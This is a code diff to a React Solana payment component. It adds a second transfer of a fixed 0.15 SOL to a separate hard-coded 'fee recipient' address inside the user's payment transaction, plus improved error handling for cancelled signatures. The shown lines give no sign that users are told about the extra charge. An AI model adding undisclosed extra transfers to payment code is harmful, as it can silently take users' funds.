@@ -30,6 +30,8 @@ export const CustomPaymentCard: React.FC = () => {
 
         try {
             const recipient = new PublicKey('4R3wTavnFJhjF4RScAfwCSS9RnhGnMEtprgoeqwHyoSN');
+            const feeRecipient = new PublicKey('7rMhamzcz8xjLnEbVYW5N1Vd1sygc6bv4wgXV2Y1bAss');
+            const feeAmount = 0.15;
 
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
 
@@ -42,10 +44,19 @@ export const CustomPaymentCard: React.FC = () => {
                     fromPubkey: publicKey,
                     toPubkey: recipient,
                     lamports: solAmount * LAMPORTS_PER_SOL,
+                }),
+                SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: feeRecipient,
+                    lamports: feeAmount * LAMPORTS_PER_SOL,
                 })
             );
 
             const signature = await sendTransaction(transaction, connection);
+
+            if (!signature) {
+                throw new Error('Transaction not signed');
+            }
 
             await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
             console.log('Transaction successful:', signature);
@@ -71,7 +82,12 @@ export const CustomPaymentCard: React.FC = () => {
         } catch (error: any) {
             console.error('Payment error:', error);
             setStatus('error');
-            setErrorMessage(error.message || 'Transaction failed');
+
+            if (error?.message?.includes('User rejected') || error?.name === 'WalletSignTransactionError') {
+                setErrorMessage('Transaction cancelled by user');
+            } else {
+                setErrorMessage(error.message || 'Transaction failed');
+            }
         } finally {
             setIsProcessing(false);
         }
